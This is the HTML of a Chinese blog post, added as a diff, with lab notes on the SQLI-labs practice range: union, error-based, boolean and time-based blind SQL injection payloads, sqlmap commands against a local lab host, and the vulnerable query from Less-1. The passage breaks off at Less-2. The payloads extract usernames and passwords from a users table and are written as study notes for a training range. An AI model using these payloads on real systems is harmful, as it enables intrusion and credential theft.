@@ -1,0 +1,1953 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='常见注入流程 联合查询注入 1 2 3 4 5 6 7 8 ?id=1&amp;#39; ?id=1&amp;#39; order by 3 --&#43; ?id=1&amp;#39; order by 4 --&#43; ?id=-1&amp;#39; union select 1,user(),version() --&#43; ?id=-1&amp;#39; union select 1,database(),version() --&#43; ?id=-1&amp;#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 --&#43; ?id=-1&amp;#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --&#43; ?id=-1&amp;#39; union select 1,2,(select group_concat(username,&amp;#39;:&amp;#39;,password&#43;SEPARATOR&#43;0x3c62723e) from users) --&#43; 报错注入 手动修改 LIMIT 0,1 来进行结果偏移
+1 2 3 4 5 6 7 8 9 ?'>
+<title>SQLI labs 靶场笔记之基础挑战 1-20 关</title>
+
+<link rel='canonical' href='https://360rce.github.io/p/gkoe77ij/'>
+
+<link rel="stylesheet" href="/scss/style.min.efe1e773d779dbe0d478a3345bc5ad949fed81363c53bfa8984135f20bf7841d.css"><meta property='og:title' content='SQLI labs 靶场笔记之基础挑战 1-20 关'>
+<meta property='og:description' content='常见注入流程 联合查询注入 1 2 3 4 5 6 7 8 ?id=1&amp;#39; ?id=1&amp;#39; order by 3 --&#43; ?id=1&amp;#39; order by 4 --&#43; ?id=-1&amp;#39; union select 1,user(),version() --&#43; ?id=-1&amp;#39; union select 1,database(),version() --&#43; ?id=-1&amp;#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 --&#43; ?id=-1&amp;#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --&#43; ?id=-1&amp;#39; union select 1,2,(select group_concat(username,&amp;#39;:&amp;#39;,password&#43;SEPARATOR&#43;0x3c62723e) from users) --&#43; 报错注入 手动修改 LIMIT 0,1 来进行结果偏移
+1 2 3 4 5 6 7 8 9 ?'>
+<meta property='og:url' content='https://360rce.github.io/p/gkoe77ij/'>
+<meta property='og:site_name' content='iceH&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='SQL注入' /><meta property='article:tag' content='sqlilab' /><meta property='article:published_time' content='2020-07-20T10:00:36&#43;00:00'/><meta property='article:modified_time' content='2020-07-20T10:00:36&#43;00:00'/><meta property='og:image' content='https://w.wallhaven.cc/full/we/wallhaven-wed2qq.png' />
+<meta name="twitter:title" content="SQLI labs 靶场笔记之基础挑战 1-20 关">
+<meta name="twitter:description" content="常见注入流程 联合查询注入 1 2 3 4 5 6 7 8 ?id=1&amp;#39; ?id=1&amp;#39; order by 3 --&#43; ?id=1&amp;#39; order by 4 --&#43; ?id=-1&amp;#39; union select 1,user(),version() --&#43; ?id=-1&amp;#39; union select 1,database(),version() --&#43; ?id=-1&amp;#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479 --&#43; ?id=-1&amp;#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --&#43; ?id=-1&amp;#39; union select 1,2,(select group_concat(username,&amp;#39;:&amp;#39;,password&#43;SEPARATOR&#43;0x3c62723e) from users) --&#43; 报错注入 手动修改 LIMIT 0,1 来进行结果偏移
+1 2 3 4 5 6 7 8 9 ?"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://w.wallhaven.cc/full/we/wallhaven-wed2qq.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+<style>
+    :root {
+     
+    --sys-font-family: "HarmonyOS_Sans_SC_Medium", Georgia, -apple-system, 'Nimbus Roman No9 L', 'PingFang SC', 'Hiragino Sans GB', 'Noto Serif SC', 'Microsoft Yahei', 'WenQuanYi Micro Hei', 'ST Heiti', sans-serif;
+    --code-font-family: "JetBrainsMono Regular", Menlo, Monaco, Consolas, "Courier New";
+    --article-font-family: "HarmonyOS_Sans_SC_Medium", var(--base-font-family);
+  }
+</style>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://npm.elemecdn.com/irithys-cdn@1.0.4/font/font.css";
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+         document.head.appendChild(customFont);
+}());
+</script>
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended">
+
+
+        <div id="article-toolbar" style="position: sticky;top: 5px;z-index: 1000;">
+            <a href="/" class="back-home">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+                <span>返回</span>
+            </a>
+        </div>
+    
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M512 256C512 397.4 397.4 512 256 512C114.6 512 0 397.4 0 256C0 114.6 114.6 0 256 0C397.4 0 512 114.6 512 256zM176 168V344C176 352.7 180.7 360.7 188.3 364.9C195.8 369.2 205.1 369 212.5 364.5L356.5 276.5C363.6 272.1 368 264.4 368 256C368 247.6 363.6 239.9 356.5 235.5L212.5 147.5C205.1 142.1 195.8 142.8 188.3 147.1C180.7 151.3 176 159.3 176 168V168z"></path></svg>
+            
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#联合查询注入">联合查询注入</a></li>
+    <li><a href="#报错注入">报错注入</a></li>
+    <li><a href="#布尔盲注">布尔盲注</a></li>
+    <li><a href="#延时盲注">延时盲注</a></li>
+    <li><a href="#sqlmap">sqlmap</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#less-1">Less-1</a>
+      <ol>
+        <li><a href="#联合查询注入-1">联合查询注入</a></li>
+      </ol>
+    </li>
+    <li><a href="#less-2">Less-2</a></li>
+    <li><a href="#less-3">Less-3</a></li>
+    <li><a href="#less-4">Less-4</a></li>
+    <li><a href="#less-5">Less-5</a></li>
+    <li><a href="#less-6">Less-6</a></li>
+    <li><a href="#less-7">Less-7</a></li>
+    <li><a href="#less-8">Less-8</a></li>
+    <li><a href="#less-9">Less-9</a></li>
+    <li><a href="#less-10">Less-10</a></li>
+    <li><a href="#less-11">Less-11</a>
+      <ol>
+        <li><a href="#万能密码">万能密码</a></li>
+      </ol>
+    </li>
+    <li><a href="#less-12">Less-12</a></li>
+    <li><a href="#less-13">Less-13</a></li>
+    <li><a href="#less-14">Less-14</a></li>
+    <li><a href="#less-15">Less-15</a></li>
+    <li><a href="#less-16">Less-16</a></li>
+    <li><a href="#less-17">Less-17</a></li>
+    <li><a href="#less-18">Less-18</a></li>
+    <li><a href="#less-19">Less-19</a></li>
+    <li><a href="#less-20">Less-20</a>
+      <ol>
+        <li><a href="#联合查询注入-2">联合查询注入</a></li>
+        <li><a href="#报错注入-1">报错注入</a></li>
+        <li><a href="#盲注">盲注</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/gkoe77ij/">
+                
+                    <img src="https://w.wallhaven.cc/full/we/wallhaven-wed2qq.png" loading="lazy" alt="Featured image of post SQLI labs 靶场笔记之基础挑战 1-20 关" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%90%B9%E6%A2%A6%E5%88%B0%E8%A5%BF%E5%B7%9E/" >
+                吹梦到西州
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/gkoe77ij/">SQLI labs 靶场笔记之基础挑战 1-20 关</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M326.1 160l127.4-127.4C451.7 32.39 449.9 32 448 32h-86.06l-128 128H326.1zM166.1 160l128-128H201.9l-128 128H166.1zM497.7 56.19L393.9 160H512V96C512 80.87 506.5 67.15 497.7 56.19zM134.1 32H64C28.65 32 0 60.65 0 96v64h6.062L134.1 32zM0 416c0 35.35 28.65 64 64 64h384c35.35 0 64-28.65 64-64V192H0V416z"></path></svg>
+                
+                <time class="article-time--published">2020/07/20</time>
+            </div>
+        
+
+        
+            <div>
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" stroke="currentColor" fill="#BDBDBF"><path d="M256 512C114.6 512 0 397.4 0 256S114.6 0 256 0S512 114.6 512 256s-114.6 256-256 256zM232 120V256c0 8 4 15.5 10.7 20l96 64c11 7.4 25.9 4.4 33.3-6.7s4.4-25.9-6.7-33.3L280 243.2V120c0-13.3-10.7-24-24-24s-24 10.7-24 24z"></path></svg>
+                
+                <time class="article-time--reading">
+                    阅读时长: 10 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="常见注入流程">常见注入流程</h1>
+<h2 id="联合查询注入">联合查询注入</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; order by 4 --+
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=-1&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="k">user</span><span class="p">(),</span><span class="k">version</span><span class="p">()</span><span class="w"> </span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,database(),version() --+
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=-1&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="mi">0</span><span class="n">x7365637572697479</span><span class="w"> </span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=-1&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="s1">&#39;:&#39;</span><span class="p">,</span><span class="n">password</span><span class="o">+</span><span class="n">SEPARATOR</span><span class="o">+</span><span class="mi">0</span><span class="n">x3c62723e</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">)</span><span class="w"> </span><span class="c1">--+
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="报错注入">报错注入</h2>
+<p>手动修改 <code>LIMIT 0,1</code> 来进行结果偏移</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">database</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema = &#39;</span><span class="k">security</span><span class="s1">&#39; limit 0,1),0x7e),1)--+ 
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;security&#39;</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--+ 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema = &#39;</span><span class="k">security</span><span class="s1">&#39; and table_name = &#39;</span><span class="n">users</span><span class="s1">&#39;),0x7e),1)--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and updatexml(1,concat(0x7e,(select username from users limit 1,1),0x7e),1)--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1)--+
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="布尔盲注">布尔盲注</h2>
+<p>数据库第一个字母为 <code>s</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and left(database(),1)&gt;&#39;</span><span class="n">r</span><span class="s1">&#39;--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">left</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span><span class="s1">&#39;s&#39;</span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and left(database(),2)&gt;&#39;</span><span class="n">sd</span><span class="s1">&#39;--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">left</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span><span class="o">&gt;</span><span class="s1">&#39;se&#39;</span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">...</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="延时盲注">延时盲注</h2>
+<p>数据库第一个字母的 ascii 码为 115，即<code>s</code></p>
+<p>利用<code>if(条件,0,1)</code>函数，当条件为真，返回0，假则返回1</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">115</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and if(ascii(substr(database(),2,1))&gt;100,1,sleep(5))--+
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">101</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">))</span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">...</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="sqlmap">sqlmap</h2>
+<p><strong>联合查询注入</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sqlmap -u <span class="s2">&#34;http://sqli.pl/Less-1/?id=1&#34;</span> --dbms<span class="o">=</span>MySQL --random-agent --flush-session --technique<span class="o">=</span>U -v <span class="m">3</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>报错注入</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sqlmap -u <span class="s2">&#34;http://sqli.pl/Less-1/?id=1&#34;</span> --dbms<span class="o">=</span>MySQL --random-agent --flush-session --technique<span class="o">=</span>E -v <span class="m">3</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>布尔盲注</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sqlmap -u <span class="s2">&#34;http://sqli.pl/Less-1/?id=1&#34;</span> --dbms<span class="o">=</span>MySQL --random-agent --flush-session --technique<span class="o">=</span>B -v <span class="m">3</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>延时盲注</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sqlmap -u <span class="s2">&#34;http://sqli.pl/Less-1/?id=1&#34;</span> --dbms<span class="o">=</span>MySQL --random-agent --flush-session --technique<span class="o">=</span>T -v <span class="m">3</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="基础挑战-1-20-关">基础挑战 1-20 关</h1>
+<h2 id="less-1">Less-1</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>联合、报错、布尔盲注、延时盲注</td>
+<td><code>id='$id'</code></td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>源码简单分析</strong>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1"># 单引号拼接
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=&#39;</span><span class="si">$id</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 支持联合、报错、布尔盲注、延时盲注
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="k">true</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">输出查询内容</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">print_r</span><span class="p">(</span><span class="nx">mysql_error</span><span class="p">());</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="联合查询注入-1">联合查询注入</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=1&#39;</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; order by 4 --+
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=-1&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="k">user</span><span class="p">(),</span><span class="k">version</span><span class="p">()</span><span class="w"> </span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,database(),version() --+
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=-1&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="mi">0</span><span class="n">x7365637572697479</span><span class="w"> </span><span class="c1">--+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+
+</span></span></span><span class="line"><span class="cl"><span class="s1">?id=-1&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="s1">&#39;:&#39;</span><span class="p">,</span><span class="n">password</span><span class="o">+</span><span class="n">SEPARATOR</span><span class="o">+</span><span class="mi">0</span><span class="n">x3c62723e</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">)</span><span class="w"> </span><span class="c1">--+
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="less-2">Less-2</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>联合、报错、布尔盲注、延时盲注</td>
+<td><code>id=$id</code></td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>源码简单分析</strong>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
